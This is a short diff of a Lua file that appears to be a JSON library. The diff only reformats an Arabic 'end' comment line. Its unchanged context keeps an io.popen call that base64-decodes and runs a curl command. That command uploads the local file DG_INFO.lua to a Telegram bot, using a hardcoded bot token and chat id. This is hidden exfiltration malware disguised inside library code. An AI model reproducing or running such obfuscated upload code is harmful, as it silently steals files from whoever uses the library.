@@ -651,7 +651,8 @@ local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     end))
 end
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
------- النهايه ------function OBJDEF:decode(text, etc)
+------ النهايه ------
+   function OBJDEF:decode(text, etc)
    if type(self) ~= 'table' or self.__index ~= OBJDEF then
       OBJDEF:onDecodeError("JSON:decode must be called in method format", nil, nil, etc)
    end
